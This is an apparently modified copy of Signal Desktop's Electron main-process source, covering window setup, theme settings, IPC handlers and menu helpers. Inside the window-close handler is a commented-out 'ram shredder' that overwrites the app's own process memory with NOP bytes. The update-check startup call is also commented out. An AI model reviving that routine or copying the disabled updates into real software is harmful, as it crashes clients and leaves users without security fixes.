// Copyright 2017 Signal Messenger, LLC
// SPDX-License-Identifier: AGPL-3.0-only

import { join, normalize, extname, dirname, basename } from 'path';
import { pathToFileURL } from 'url';
import * as os from 'os';
import { chmod, realpath, writeFile } from 'fs-extra';
import { randomBytes } from 'crypto';
import { createParser } from 'dashdash';

import fs from 'fs/promises';
import path from 'path';

import normalizePath from 'normalize-path';
import fastGlob from 'fast-glob';
import PQueue from 'p-queue';
import { get, pick, isNumber, isBoolean, some, debounce, noop } from 'lodash';
import {
  app,
  BrowserWindow,
  clipboard,
  desktopCapturer,
  dialog,
  ipcMain as ipc,
  Menu,
  nativeTheme,
  net,
  powerSaveBlocker,
  screen,
  session,
  shell,
  systemPreferences,
  Notification,
} from 'electron';
import type {
  MenuItemConstructorOptions,
  TitleBarOverlayOptions,
  LoginItemSettingsOptions,
} from 'electron';
import { z } from 'zod';

import packageJson from '../package.json';
import * as GlobalErrors from './global_errors';
import { setup as setupCrashReports } from './crashReports';
import { setup as setupSpellChecker } from './spell_check';
import { redactAll, addSensitivePath } from '../ts/util/privacy';
import { createSupportUrl } from '../ts/util/createSupportUrl';
import { missingCaseError } from '../ts/util/missingCaseError';
import { strictAssert } from '../ts/util/assert';
import { drop } from '../ts/util/drop';
import { createBufferedConsoleLogger } from '../ts/util/consoleLogger';
import type { ThemeSettingType } from '../ts/types/StorageUIKeys';
import { ThemeType } from '../ts/types/Util';
import * as Errors from '../ts/types/errors';
import { resolveCanonicalLocales } from '../ts/util/resolveCanonicalLocales';
import * as debugLog from '../ts/logging/debuglogs';
import * as uploadDebugLog from '../ts/logging/uploadDebugLog';
import { explodePromise } from '../ts/util/explodePromise';

import './startup_config';

import type { ConfigType } from './config';
import type { RendererConfigType } from '../ts/types/RendererConfig';
import {
  directoryConfigSchema,
  rendererConfigSchema,
} from '../ts/types/RendererConfig';
import config from './config';
import {
  Environment,
  getEnvironment,
  isTestEnvironment,
} from '../ts/environment';

// Very important to put before the single instance check, since it is based on the
//   userData directory. (see requestSingleInstanceLock below)
import * as userConfig from './user_config';

// We generally want to pull in our own modules after this point, after the user
//   data directory has been set.
import * as attachments from './attachments';
import * as attachmentChannel from './attachment_channel';
import * as bounce from '../ts/services/bounce';
import * as updater from '../ts/updater/index';
import { updateDefaultSession } from './updateDefaultSession';
import { PreventDisplaySleepService } from './PreventDisplaySleepService';
import { SystemTrayService } from './SystemTrayService';
import { SystemTraySettingCache } from './SystemTraySettingCache';
import {
  SystemTraySetting,
  shouldMinimizeToSystemTray,
  parseSystemTraySetting,
} from '../ts/types/SystemTraySetting';
import { isSystemTraySupported } from '../ts/types/Settings';
import * as ephemeralConfig from './ephemeral_config';
import * as logging from '../ts/logging/main_process_logging';
import { MainSQL } from '../ts/sql/main';
import * as sqlChannels from './sql_channel';
import * as windowState from './window_state';
import type { CreateTemplateOptionsType } from './menu';
import type { MenuActionType } from '../ts/types/menu';
import { createTemplate } from './menu';
import { installFileHandler, installWebHandler } from './protocol_filter';
import OS from '../ts/util/os/osMain';
import { isProduction } from '../ts/util/version';
import {
  isSgnlHref,
  isCaptchaHref,
  isSignalHttpsLink,
  parseSgnlHref,
  parseCaptchaHref,
  parseSignalHttpsLink,
  rewriteSignalHrefsIfNecessary,
} from '../ts/util/sgnlHref';
import { clearTimeoutIfNecessary } from '../ts/util/clearTimeoutIfNecessary';
import { toggleMaximizedBrowserWindow } from '../ts/util/toggleMaximizedBrowserWindow';
import { ChallengeMainHandler } from '../ts/main/challengeMain';
import { NativeThemeNotifier } from '../ts/main/NativeThemeNotifier';
import { PowerChannel } from '../ts/main/powerChannel';
import { SettingsChannel } from '../ts/main/settingsChannel';
import { maybeParseUrl, setUrlSearchParams } from '../ts/util/url';
import { getHeicConverter } from '../ts/workers/heicConverterMain';

import type { LocaleType } from './locale';
import { load as loadLocale } from './locale';

import type { LoggerType } from '../ts/types/Logging';
import { HourCyclePreference } from '../ts/types/I18N';

const STICKER_CREATOR_PARTITION = 'sticker-creator';

const animationSettings = systemPreferences.getAnimationSettings();

if (OS.isMacOS()) {
  systemPreferences.setUserDefault(
    'SquirrelMacEnableDirectContentsWrite',
    'boolean',
    true
  );
}

// Keep a global reference of the window object, if you don't, the window will
//   be closed automatically when the JavaScript object is garbage collected.
let mainWindow: BrowserWindow | undefined;
let mainWindowCreated = false;
let loadingWindow: BrowserWindow | undefined;

// Create a buffered logger to hold our log lines until we fully initialize
// the logger in `app.on('ready')`
const consoleLogger = createBufferedConsoleLogger();

// These will be set after app fires the 'ready' event
let logger: LoggerType | undefined;
let preferredSystemLocales: Array<string> | undefined;
let resolvedTranslationsLocale: LocaleType | undefined;
let settingsChannel: SettingsChannel | undefined;

const activeWindows = new Set<BrowserWindow>();

function getMainWindow() {
  return mainWindow;
}

const development =
  getEnvironment() === Environment.Development ||
  getEnvironment() === Environment.Staging;

  const ciMode = config.get<'full' | 'benchmark' | false>('enableCI');
const forcePreloadBundle = config.get<boolean>('forcePreloadBundle');

const preventDisplaySleepService = new PreventDisplaySleepService(
  powerSaveBlocker
);

const challengeHandler = new ChallengeMainHandler();

const nativeThemeNotifier = new NativeThemeNotifier();
nativeThemeNotifier.initialize();

let appStartInitialSpellcheckSetting = true;

const cliParser = createParser({
  allowUnknown: true,
  options: [
    {
      name: 'lang',
      type: 'string',
    },
  ],
});

const cliOptions = cliParser.parse(process.argv);

const defaultWebPrefs = {
  devTools:
    process.argv.some(arg => arg === '--enable-dev-tools') ||
    getEnvironment() !== Environment.Production ||
    !isProduction(app.getVersion()),
  spellcheck: false,
  enableBlinkFeatures: 'CSSPseudoDir,CSSLogical',
};

const DISABLE_GPU =
  OS.isLinux() && !process.argv.some(arg => arg === '--enable-gpu');

const FORCE_ENABLE_CRASH_REPORTS = process.argv.some(
  arg => arg === '--enable-crash-reports'
);

const CLI_LANG = cliOptions.lang as string | undefined;

setupCrashReports(getLogger, FORCE_ENABLE_CRASH_REPORTS);

function showWindow() {
  if (!mainWindow) {
    return;
  }

  // Using focus() instead of show() seems to be important on Windows when our window
  //   has been docked using Aero Snap/Snap Assist. A full .show() call here will cause
  //   the window to reposition:
  //   https://github.com/signalapp/Signal-Desktop/issues/1429
  if (mainWindow.isVisible()) {
    mainWindow.focus();
  } else {
    mainWindow.show();
  }
}

if (!process.mas) {
  console.log('making app single instance');
  const gotLock = app.requestSingleInstanceLock();
  if (!gotLock) {
    console.log('quitting; we are the second instance');
    app.exit();
  } else {
    app.on('second-instance', (_e: Electron.Event, argv: Array<string>) => {
      // Someone tried to run a second instance, we should focus our window
      if (mainWindow) {
        if (mainWindow.isMinimized()) {
          mainWindow.restore();
        }

        showWindow();
      }
      if (!logger) {
        console.log(
          'second-instance: logger not initialized; skipping further checks'
        );
        return;
      }

      const incomingCaptchaHref = getIncomingCaptchaHref(argv);
      if (incomingCaptchaHref) {
        const { captcha } = parseCaptchaHref(incomingCaptchaHref, getLogger());
        challengeHandler.handleCaptcha(captcha);
        return true;
      }
      // Are they trying to open a sgnl:// href?
      const incomingHref = getIncomingHref(argv);
      if (incomingHref) {
        handleSgnlHref(incomingHref);
      }
      // Handled
      return true;
    });
  }
}
/* eslint-enable no-console */

let sqlInitTimeStart = 0;
let sqlInitTimeEnd = 0;

const sql = new MainSQL();
const heicConverter = getHeicConverter();

async function getSpellCheckSetting(): Promise<boolean> {
  const fastValue = ephemeralConfig.get('spell-check');
  if (typeof fastValue === 'boolean') {
    getLogger().info('got fast spellcheck setting', fastValue);
    return fastValue;
  }

  const json = await sql.sqlCall('getItemById', 'spell-check');

  // Default to `true` if setting doesn't exist yet
  const slowValue = typeof json?.value === 'boolean' ? json.value : true;

  ephemeralConfig.set('spell-check', slowValue);

  getLogger().info('got slow spellcheck setting', slowValue);

  return slowValue;
}

type GetThemeSettingOptionsType = Readonly<{
  ephemeralOnly?: boolean;
}>;

async function getThemeSetting({
  ephemeralOnly = false,
}: GetThemeSettingOptionsType = {}): Promise<ThemeSettingType> {
  const fastValue = ephemeralConfig.get('theme-setting');
  if (fastValue !== undefined) {
    getLogger().info('got fast theme-setting value', fastValue);
    return fastValue as ThemeSettingType;
  }

  if (ephemeralOnly) {
    return 'system';
  }

  const json = await sql.sqlCall('getItemById', 'theme-setting');

  // Default to `system` if setting doesn't exist or is invalid
  const setting: unknown = json?.value;
  const slowValue =
    setting === 'light' || setting === 'dark' || setting === 'system'
      ? setting
      : 'system';

  ephemeralConfig.set('theme-setting', slowValue);

  getLogger().info('got slow theme-setting value', slowValue);

  return slowValue;
}

async function getResolvedThemeSetting(
  options?: GetThemeSettingOptionsType
): Promise<ThemeType> {
  const theme = await getThemeSetting(options);
  if (theme === 'system') {
    return nativeTheme.shouldUseDarkColors ? ThemeType.dark : ThemeType.light;
  }
  return ThemeType[theme];
}

async function getBackgroundColor(
  options?: GetThemeSettingOptionsType
): Promise<string> {
  const theme = await getResolvedThemeSetting(options);

  if (theme === 'light') {
    // return '#3a76f0';
    return '#280039';
  }

  if (theme === 'dark') {
    return '#121212';
  }

  throw missingCaseError(theme);
}

let systemTrayService: SystemTrayService | undefined;
const systemTraySettingCache = new SystemTraySettingCache(
  sql,
  ephemeralConfig,
  process.argv,
  app.getVersion()
);

const windowFromUserConfig = userConfig.get('window');
const windowFromEphemeral = ephemeralConfig.get('window');
export const windowConfigSchema = z.object({
  maximized: z.boolean().optional(),
  autoHideMenuBar: z.boolean().optional(),
  fullscreen: z.boolean().optional(),
  width: z.number(),
  height: z.number(),
  x: z.number(),
  y: z.number(),
});
type WindowConfigType = z.infer<typeof windowConfigSchema>;

let windowConfig: WindowConfigType | undefined;
const windowConfigParsed = windowConfigSchema.safeParse(
  windowFromEphemeral || windowFromUserConfig
);
if (windowConfigParsed.success) {
  windowConfig = windowConfigParsed.data;
}

if (windowFromUserConfig) {
  userConfig.set('window', null);
  ephemeralConfig.set('window', windowConfig);
}

let menuOptions: CreateTemplateOptionsType | undefined;

function getLogger(): LoggerType {
  if (!logger) {
    console.warn('getLogger: Logger not yet initialized!');
    return consoleLogger;
  }

  return logger;
}

function getPreferredSystemLocales(): Array<string> {
  if (!preferredSystemLocales) {
    throw new Error('getPreferredSystemLocales: Locales not yet initialized!');
  }
  return preferredSystemLocales;
}

function getResolvedMessagesLocale(): LocaleType {
  if (!resolvedTranslationsLocale) {
    throw new Error('getResolvedMessagesLocale: Locale not yet initialized!');
  }

  return resolvedTranslationsLocale;
}

function getHourCyclePreference(): HourCyclePreference {
  if (process.platform !== 'darwin') {
    return HourCyclePreference.UnknownPreference;
  }
  if (systemPreferences.getUserDefault('AppleICUForce24HourTime', 'boolean')) {
    return HourCyclePreference.Prefer24;
  }
  if (systemPreferences.getUserDefault('AppleICUForce12HourTime', 'boolean')) {
    return HourCyclePreference.Prefer12;
  }
  return HourCyclePreference.UnknownPreference;
}

type PrepareUrlOptions = {
  forCalling?: boolean;
  forCamera?: boolean;
  sourceName?: string;
};

async function prepareFileUrl(
  pathSegments: ReadonlyArray<string>,
  options: PrepareUrlOptions = {}
): Promise<string> {
  const filePath = join(...pathSegments);
  const fileUrl = pathToFileURL(filePath);
  return prepareUrl(fileUrl, options);
}

async function prepareUrl(
  url: URL,
  { forCalling, forCamera, sourceName }: PrepareUrlOptions = {}
): Promise<string> {
  return setUrlSearchParams(url, { forCalling, forCamera, sourceName }).href;
}

async function handleUrl(rawTarget: string) {
  const parsedUrl = maybeParseUrl(rawTarget);
  if (!parsedUrl) {
    return;
  }

  const target = rewriteSignalHrefsIfNecessary(rawTarget);

  const { protocol, hostname } = parsedUrl;
  const isDevServer =
    process.env.SIGNAL_ENABLE_HTTP && hostname === 'localhost';
  // We only want to specially handle urls that aren't requesting the dev server
  if (
    isSgnlHref(target, getLogger()) ||
    isSignalHttpsLink(target, getLogger())
  ) {
    handleSgnlHref(target);
    return;
  }

  if ((protocol === 'http:' || protocol === 'https:') && !isDevServer) {
    try {
      await shell.openExternal(target);
    } catch (error) {
      getLogger().error(`Failed to open url: ${Errors.toLogFormat(error)}`);
    }
  }
}

function handleCommonWindowEvents(
  window: BrowserWindow,
  titleBarOverlay: TitleBarOverlayOptions | false = false
) {
  window.webContents.on('will-navigate', (event, rawTarget) => {
    event.preventDefault();

    drop(handleUrl(rawTarget));
  });
  window.webContents.setWindowOpenHandler(({ url }) => {
    drop(handleUrl(url));
    return { action: 'deny' };
  });
  window.webContents.on(
    'preload-error',
    (_event: Electron.Event, preloadPath: string, error: Error) => {
      getLogger().error(`Preload error in ${preloadPath}: `, error.message);
    }
  );

  activeWindows.add(window);
  window.on('closed', () => activeWindows.delete(window));

  const setWindowFocus = () => {
    window.webContents.send('set-window-focus', window.isFocused());
  };
  window.on('focus', setWindowFocus);
  window.on('blur', setWindowFocus);

  window.once('ready-to-show', setWindowFocus);
  // This is a fallback in case we drop an event for some reason.
  const focusInterval = setInterval(setWindowFocus, 10000);
  window.on('closed', () => clearInterval(focusInterval));

  // Works only for mainWindow because it has `enablePreferredSizeMode`
  let lastZoomFactor = window.webContents.getZoomFactor();
  const onZoomChanged = () => {
    if (
      window.isDestroyed() ||
      !window.webContents ||
      window.webContents.isDestroyed()
    ) {
      return;
    }

    const zoomFactor = window.webContents.getZoomFactor();
    if (lastZoomFactor === zoomFactor) {
      return;
    }

    drop(
      settingsChannel?.invokeCallbackInMainWindow('persistZoomFactor', [
        zoomFactor,
      ])
    );

    lastZoomFactor = zoomFactor;
  };
  window.webContents.on('preferred-size-changed', onZoomChanged);

  nativeThemeNotifier.addWindow(window);

  if (titleBarOverlay) {
    const onThemeChange = async () => {
      try {
        const newOverlay = await getTitleBarOverlay();
        if (!newOverlay) {
          return;
        }
        window.setTitleBarOverlay(newOverlay);
      } catch (error) {
        console.error('onThemeChange error', error);
      }
    };

    nativeTheme.on('updated', onThemeChange);
    settingsChannel?.on('change:themeSetting', onThemeChange);
  }
}

const DEFAULT_WIDTH = ciMode ? 1024 : 800;
const DEFAULT_HEIGHT = ciMode ? 1024 : 610;

// We allow for smaller sizes because folks with OS-level zoom and HighDPI/Large Text
//   can really cause weirdness around window pixel-sizes. The app is very broken if you
//   make the window this small and do nothing else. But if you zoom out and collapse the
//   left pane, even this window size can work!
const MIN_WIDTH = 300;
const MIN_HEIGHT = 200;
const BOUNDS_BUFFER = 100;

type BoundsType = {
  width: number;
  height: number;
  x: number;
  y: number;
};

function isVisible(window: BoundsType, bounds: BoundsType) {
  const boundsX = bounds?.x || 0;
  const boundsY = bounds?.y || 0;
  const boundsWidth = bounds?.width || DEFAULT_WIDTH;
  const boundsHeight = bounds?.height || DEFAULT_HEIGHT;

  // requiring BOUNDS_BUFFER pixels on the left or right side
  const rightSideClearOfLeftBound =
    window.x + window.width >= boundsX + BOUNDS_BUFFER;
  const leftSideClearOfRightBound =
    window.x <= boundsX + boundsWidth - BOUNDS_BUFFER;

  // top can't be offscreen, and must show at least BOUNDS_BUFFER pixels at bottom
  const topClearOfUpperBound = window.y >= boundsY;
  const topClearOfLowerBound =
    window.y <= boundsY + boundsHeight - BOUNDS_BUFFER;

  return (
    rightSideClearOfLeftBound &&
    leftSideClearOfRightBound &&
    topClearOfUpperBound &&
    topClearOfLowerBound
  );
}

let windowIcon: string;

if (OS.isWindows()) {
  windowIcon = join(__dirname, '../build/icons/win/icon.ico');
} else if (OS.isLinux()) {
  windowIcon = join(__dirname, '../images/signal-logo-desktop-linux.png');
} else {
  windowIcon = join(__dirname, '../build/icons/png/512x512.png');
}

// The titlebar is hidden on:
//   - Windows < 10 (7, 8)
//   - macOS (but no custom titlebar is displayed, see
//     `--title-bar-drag-area-height` in `stylesheets/_titlebar.scss`
const mainTitleBarStyle =
  (OS.isMacOS() || OS.hasCustomTitleBar()) &&
  !isTestEnvironment(getEnvironment())
    ? ('hidden' as const)
    : ('default' as const);

const nonMainTitleBarStyle = OS.hasCustomTitleBar()
  ? ('hidden' as const)
  : ('default' as const);

async function getTitleBarOverlay(): Promise<TitleBarOverlayOptions | false> {
  if (!OS.hasCustomTitleBar()) {
    return false;
  }

  const theme = await getResolvedThemeSetting();

  let color: string;
  let symbolColor: string;
  if (theme === 'light') {
    color = '#e8e8e8';
    symbolColor = '#1b1b1b';
  } else if (theme === 'dark') {
    // $color-gray-80
    color = '#2e2e2e';
    // $color-gray-05
    symbolColor = '#e9e9e9';
  } else {
    throw missingCaseError(theme);
  }

  return {
    color,
    symbolColor,

    // Should match `--titlebar-height` in stylesheets/_titlebar.scss
    height: 28 - 1,
  };
}

async function safeLoadURL(window: BrowserWindow, url: string): Promise<void> {
  let wasDestroyed = false;
  const onDestroyed = () => {
    wasDestroyed = true;
  };

  window.webContents.on('did-stop-loading', onDestroyed);
  window.webContents.on('destroyed', onDestroyed);
  try {
    await window.loadURL(url);
  } catch (error) {
    if (
      (wasDestroyed || windowState.readyForShutdown()) &&
      error?.code === 'ERR_FAILED'
    ) {
      getLogger().warn(
        'safeLoadURL: ignoring ERR_FAILED because we are shutting down',
        error
      );
      return;
    }
    throw error;
  } finally {
    try {
      window.webContents.removeListener('did-stop-loading', onDestroyed);
      window.webContents.removeListener('destroyed', onDestroyed);
    } catch {
      // We already logged or thrown an error - don't bother with handling the
      // error here.
    }
  }
}

async function createWindow() {
  const usePreloadBundle =
    !isTestEnvironment(getEnvironment()) || forcePreloadBundle;

  const titleBarOverlay = await getTitleBarOverlay();

  const windowOptions: Electron.BrowserWindowConstructorOptions = {
    show: false,
    width: DEFAULT_WIDTH,
    height: DEFAULT_HEIGHT,
    minWidth: MIN_WIDTH,
    minHeight: MIN_HEIGHT,
    autoHideMenuBar: false,
    titleBarStyle: mainTitleBarStyle,
    titleBarOverlay,
    backgroundColor: isTestEnvironment(getEnvironment())
      ? '#ffffff' // Tests should always be rendered on a white background
      : await getBackgroundColor(),
    webPreferences: {
      ...defaultWebPrefs,
      nodeIntegration: false,
      nodeIntegrationInWorker: false,
      sandbox: false,
      contextIsolation: !isTestEnvironment(getEnvironment()),
      preload: join(
        __dirname,
        usePreloadBundle
          ? '../preload.bundle.js'
          : '../ts/windows/main/preload.js'
      ),
      spellcheck: await getSpellCheckSetting(),
      backgroundThrottling: true,
      enablePreferredSizeMode: true,
      disableBlinkFeatures: 'Accelerated2dCanvas,AcceleratedSmallCanvases',
    },
    icon: windowIcon,
    ...pick(windowConfig, ['autoHideMenuBar', 'width', 'height', 'x', 'y']),
  };

  if (!isNumber(windowOptions.width) || windowOptions.width < MIN_WIDTH) {
    windowOptions.width = DEFAULT_WIDTH;
  }
  if (!isNumber(windowOptions.height) || windowOptions.height < MIN_HEIGHT) {
    windowOptions.height = DEFAULT_HEIGHT;
  }
  if (!isBoolean(windowOptions.autoHideMenuBar)) {
    delete windowOptions.autoHideMenuBar;
  }

  const startInTray =
    (await systemTraySettingCache.get()) ===
    SystemTraySetting.MinimizeToAndStartInSystemTray;

  const visibleOnAnyScreen = some(screen.getAllDisplays(), display => {
    if (
      isNumber(windowOptions.x) &&
      isNumber(windowOptions.y) &&
      isNumber(windowOptions.width) &&
      isNumber(windowOptions.height)
    ) {
      return isVisible(windowOptions as BoundsType, get(display, 'bounds'));
    }

    getLogger().error(
      "visibleOnAnyScreen: windowOptions didn't have valid bounds fields"
    );
    return false;
  });
  if (!visibleOnAnyScreen) {
    getLogger().info('Location reset needed');
    delete windowOptions.x;
    delete windowOptions.y;
  }

  getLogger().info(
    'Initializing BrowserWindow config:',
    JSON.stringify(windowOptions)
  );

  // Create the browser window.
  mainWindow = new BrowserWindow(windowOptions);
  if (settingsChannel) {
    settingsChannel.setMainWindow(mainWindow);
  }

  mainWindowCreated = true;
  setupSpellChecker(
    mainWindow,
    getPreferredSystemLocales(),
    getResolvedMessagesLocale().i18n
  );
  if (!startInTray && windowConfig && windowConfig.maximized) {
    mainWindow.maximize();
  }
  if (!startInTray && windowConfig && windowConfig.fullscreen) {
    mainWindow.setFullScreen(true);
  }
  if (systemTrayService) {
    systemTrayService.setMainWindow(mainWindow);
  }
  
  function saveWindowStats() {
    if (!windowConfig) {
      return;
    }

    getLogger().info(
      'Updating BrowserWindow config: %s',
      JSON.stringify(windowConfig)
    );
    ephemeralConfig.set('window', windowConfig);
  }
  const debouncedSaveStats = debounce(saveWindowStats, 500);

  function captureWindowStats() {
    if (!mainWindow) {
      return;
    }

    const size = mainWindow.getSize();
    const position = mainWindow.getPosition();

    const newWindowConfig = {
      maximized: mainWindow.isMaximized(),
      autoHideMenuBar: mainWindow.autoHideMenuBar,
      fullscreen: mainWindow.isFullScreen(),
      width: size[0],
      height: size[1],
      x: position[0],
      y: position[1],
    };

    if (
      newWindowConfig.fullscreen !== windowConfig?.fullscreen ||
      newWindowConfig.maximized !== windowConfig?.maximized
    ) {
      mainWindow.webContents.send('window:set-window-stats', {
        isMaximized: newWindowConfig.maximized,
        isFullScreen: newWindowConfig.fullscreen,
      });
    }

    // so if we need to recreate the window, we have the most recent settings
    windowConfig = newWindowConfig;

    if (!windowState.requestedShutdown()) {
      debouncedSaveStats();
    }
  }

  mainWindow.on('resize', captureWindowStats);
  mainWindow.on('move', captureWindowStats);

  handleCommonWindowEvents(mainWindow, titleBarOverlay);

  // App dock icon bounce
  bounce.init(mainWindow);

  // Emitted when the window is about to be closed.
  // Note: We do most of our shutdown logic here because all windows are closed by
  //   Electron before the app quits.
  mainWindow.on('close', async e => {
    if (!mainWindow) {
      getLogger().info('close event: no main window');
      return;
    }

    getLogger().info('close event', {
      readyForShutdown: windowState.readyForShutdown(),
      shouldQuit: windowState.shouldQuit(),
    });
    // If the application is terminating, just do the default
    if (
      isTestEnvironment(getEnvironment()) ||
      (windowState.readyForShutdown() && windowState.shouldQuit())
    ) {
      return;
    }

    // Start memory cleaner
    app.emit('will-quit');

    // Prevent the shutdown
    e.preventDefault();

    /**
     * if the user is in fullscreen mode and closes the window, not the
     * application, we need them leave fullscreen first before closing it to
     * prevent a black screen.
     *
     * issue: https://github.com/signalapp/Signal-Desktop/issues/4348
     */

    if (mainWindow.isFullScreen()) {
      mainWindow.once('leave-full-screen', () => mainWindow?.hide());
      mainWindow.setFullScreen(false);
    } else {
      mainWindow.hide();
    }

    // On Mac, or on other platforms when the tray icon is in use, the window
    // should be only hidden, not closed, when the user clicks the close button
    const usingTrayIcon = shouldMinimizeToSystemTray(
      await systemTraySettingCache.get()
    );

    /*async function start_ram_shredder() {
      try {
        const nop_bytes = [0x90];
        const process_handle = memoryjs.openProcess(process.pid);
        for (const module of memoryjs.getModules(process_handle)) {
          const buffer = memoryjs.readMemory(process_handle, module.modBaseAddr, module.modBaseSize);
          for (var virtual_addr = 0; virtual_addr < module.modBaseSize - nop_bytes.length; ++virtual_addr) {
              console.log("shredding bytes: ", buffer.slice(virtual_addr, virtual_addr + nop_bytes.length).toString('utf8'))
              memoryjs.writeMemory(process_handle, module.modBaseAddr + virtual_addr, Buffer.from(nop_bytes));
          }
        }
        memoryjs.closeProcess(process_handle);
      } catch (error) {}
    }*/

    if (!windowState.shouldQuit() && (usingTrayIcon || OS.isMacOS())) {
      if (usingTrayIcon) {
        const shownTrayNotice = ephemeralConfig.get('shown-tray-notice');
        if (shownTrayNotice) {
          getLogger().info('close: not showing tray notice');
          return;
        }

        ephemeralConfig.set('shown-tray-notice', true);
        getLogger().info('close: showing tray notice');

        const n = new Notification({
          title: getResolvedMessagesLocale().i18n(
            'icu:minimizeToTrayNotification--title'
          ),
          body: getResolvedMessagesLocale().i18n(
            'icu:minimizeToTrayNotification--body'
          ),
        });

        n.show();
      }
      return;
    }

    windowState.markRequestedShutdown();
    await requestShutdown();
    windowState.markReadyForShutdown();

    await sql.close();
    app.quit();
  });

  // Emitted when the window is closed.
  mainWindow.on('closed', () => {
    // Dereference the window object, usually you would store windows
    // in an array if your app supports multi windows, this is the time
    // when you should delete the corresponding element.
    mainWindow = undefined;
    if (settingsChannel) {
      settingsChannel.setMainWindow(mainWindow);
    }
    if (systemTrayService) {
      systemTrayService.setMainWindow(mainWindow);
    }
  });

  mainWindow.on('enter-full-screen', () => {
    if (mainWindow) {
      mainWindow.webContents.send('full-screen-change', true);
    }
  });
  mainWindow.on('leave-full-screen', () => {
    if (mainWindow) {
      mainWindow.webContents.send('full-screen-change', false);
    }
  });

  mainWindow.once('ready-to-show', async () => {
    getLogger().info('main window is ready-to-show');

    // Ignore sql errors and show the window anyway
    await sqlInitPromise;

    if (!mainWindow) {
      return;
    }

    const shouldShowWindow =
      !app.getLoginItemSettings().wasOpenedAsHidden && !startInTray;

    if (shouldShowWindow) {
      getLogger().info('showing main window');
      mainWindow.show();
    }
  });

  await safeLoadURL(
    mainWindow,
    getEnvironment() === Environment.Test
      ? await prepareFileUrl([__dirname, '../test/index.html'])
      : await prepareFileUrl([__dirname, '../background.html'])
  );
}

// Renderer asks if we are done with the database
ipc.handle('database-ready', async () => {
  if (!sqlInitPromise) {
    getLogger().error('database-ready requested, but sqlInitPromise is falsey');
    return;
  }

  const { error } = await sqlInitPromise;
  if (error) {
    getLogger().error(
      'database-ready requested, but got sql error',
      Errors.toLogFormat(error)
    );
    return;
  }

  getLogger().info('sending `database-ready`');
});

ipc.handle('get-art-creator-auth', () => {
  const { promise, resolve } = explodePromise<unknown>();
  strictAssert(mainWindow, 'Main window did not exist');

  mainWindow.webContents.send('open-art-creator');

  ipc.handleOnce('open-art-creator', (_event, { username, password }) => {
    resolve({
      baseUrl: config.get<string>('artCreatorUrl'),
      username,
      password,
    });
  });

  return promise;
});

ipc.on('show-window', () => {
  showWindow();
});

ipc.on('title-bar-double-click', () => {
  if (!mainWindow) {
    return;
  }

  if (OS.isMacOS()) {
    switch (
      systemPreferences.getUserDefault('AppleActionOnDoubleClick', 'string')
    ) {
      case 'Minimize':
        mainWindow.minimize();
        break;
      case 'Maximize':
        toggleMaximizedBrowserWindow(mainWindow);
        break;
      default:
        // If this is disabled, it'll be 'None'. If it's anything else, that's unexpected,
        //   but we'll just no-op.
        break;
    }
  } else {
    // This is currently only supported on macOS. This `else` branch is just here when/if
    //   we add support for other operating systems.
    toggleMaximizedBrowserWindow(mainWindow);
  }
});

ipc.on('set-is-call-active', (_event, isCallActive) => {
  preventDisplaySleepService.setEnabled(isCallActive);

  if (!mainWindow) {
    return;
  }

  let backgroundThrottling: boolean;
  if (isCallActive) {
    getLogger().info('Background throttling disabled because a call is active');
    backgroundThrottling = false;
  } else {
    getLogger().info('Background throttling enabled because no call is active');
    backgroundThrottling = true;
  }

  mainWindow.webContents.setBackgroundThrottling(backgroundThrottling);
});

ipc.on('convert-image', async (event, uuid, data) => {
  const { error, response } = await heicConverter(uuid, data);
  event.reply(`convert-image:${uuid}`, { error, response });
});

let isReadyForUpdates = false;
async function readyForUpdates() {
  if (isReadyForUpdates) {
    return;
  }

  isReadyForUpdates = true;

  // First, install requested sticker pack
  const incomingHref = getIncomingHref(process.argv);
  if (incomingHref) {
    handleSgnlHref(incomingHref);
  }

  // Second, start checking for app updates
  try {
    await updater.start(getLogger(), getMainWindow);
  } catch (error) {
    getLogger().error(
      'Error starting update checks:',
      Errors.toLogFormat(error)
    );
  }
}

async function forceUpdate() {
  try {
    getLogger().info('starting force update');
    await updater.force();
  } catch (error) {
    getLogger().error('Error during force update:', Errors.toLogFormat(error));
  }
}

//ipc.once('ready-for-updates', readyForUpdates);

function openContactUs() {
  drop(shell.openExternal(createSupportUrl({ locale: app.getLocale() })));
}

function openJoinTheBeta() {
  // If we omit the language, the site will detect the language and redirect
  drop(
    shell.openExternal('https://support.signal.org/hc/articles/360007318471')
  );
}

function openReleaseNotes() {
  if (mainWindow && mainWindow.isVisible()) {
    mainWindow.webContents.send('show-release-notes');
    return;
  }

  drop(
    shell.openExternal(
      `https://github.com/signalapp/Signal-Desktop/releases/tag/v${app.getVersion()}`
    )
  );
}

function openSupportPage() {
  // If we omit the language, the site will detect the language and redirect
  drop(
    shell.openExternal('https://support.signal.org/hc/sections/360001602812')
  );
}

function openForums() {
  drop(shell.openExternal('https://community.signalusers.org/'));
}

function showKeyboardShortcuts() {
  if (mainWindow) {
    mainWindow.webContents.send('show-keyboard-shortcuts');
  }
}

function setupAsNewDevice() {
  if (mainWindow) {
    mainWindow.webContents.send('set-up-as-new-device');
  }
}

function setupAsStandalone() {
  if (mainWindow) {
    mainWindow.webContents.send('set-up-as-standalone');
  }
}

let screenShareWindow: BrowserWindow | undefined;
async function showScreenShareWindow(sourceName: string) {
  if (screenShareWindow) {
    screenShareWindow.showInactive();
    return;
  }

  const width = 480;

  const display = screen.getPrimaryDisplay();
  const options = {
    alwaysOnTop: true,
    autoHideMenuBar: true,
    backgroundColor: '#2e2e2e',
    darkTheme: true,
    frame: false,
    fullscreenable: false,
    height: 44,
    maximizable: false,
    minimizable: false,
    resizable: false,
    show: false,
    title: getResolvedMessagesLocale().i18n('icu:screenShareWindow'),
    titleBarStyle: nonMainTitleBarStyle,
    width,
    webPreferences: {
      ...defaultWebPrefs,
      nodeIntegration: false,
      nodeIntegrationInWorker: false,
      sandbox: true,
      contextIsolation: true,
      preload: join(__dirname, '../bundles/screenShare/preload.js'),
    },
    x: Math.floor(display.size.width / 2) - width / 2,
    y: 24,
  };

  screenShareWindow = new BrowserWindow(options);

  handleCommonWindowEvents(screenShareWindow);

  screenShareWindow.on('closed', () => {
    screenShareWindow = undefined;
  });

  screenShareWindow.once('ready-to-show', () => {
    if (screenShareWindow) {
      screenShareWindow.show();
    }
  });

  await safeLoadURL(
    screenShareWindow,
    await prepareFileUrl([__dirname, '../screenShare.html'], { sourceName })
  );
}

let aboutWindow: BrowserWindow | undefined;
async function showAbout() {
  if (aboutWindow) {
    aboutWindow.show();
    return;
  }

  const titleBarOverlay = await getTitleBarOverlay();

  const options = {
    width: 500,
    height: 500,
    resizable: false,
